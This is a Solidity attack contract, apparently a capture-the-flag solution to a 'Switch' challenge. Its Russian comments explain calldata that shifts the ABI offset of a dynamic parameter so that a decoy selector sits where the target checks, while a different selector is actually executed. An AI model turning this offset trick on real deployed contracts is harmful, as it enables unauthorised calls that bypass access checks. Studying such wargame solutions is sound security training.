// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract HackSwitch {
    // 30c13ade -- селектор
    // 0000000000000000000000000000000000000000000000000000000000000020 -- смещение до параметра data
    // 0000000000000000000000000000000000000000000000000000000000000004 -- длина data
    // 20606e1500000000000000000000000000000000000000000000000000000000 -- data

    // 30c13ade -- селектор
    // 0000000000000000000000000000000000000000000000000000000000000060 -- смещение до параметра data
    // 0000000000000000000000000000000000000000000000000000000000000000 -- пропуск (для извлечения с 68 позиции)
    // 20606e1500000000000000000000000000000000000000000000000000000000 -- то что извлекается при проверки - 20606e15
    // 0000000000000000000000000000000000000000000000000000000000000004 -- длина data
    // 76227e1200000000000000000000000000000000000000000000000000000000 -- data

    // 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
    function attack(address _addrSwitch, bytes memory _data) external {
        (bool success, ) = _addrSwitch.call(_data);
        require(success, "call failed :(");
    }
}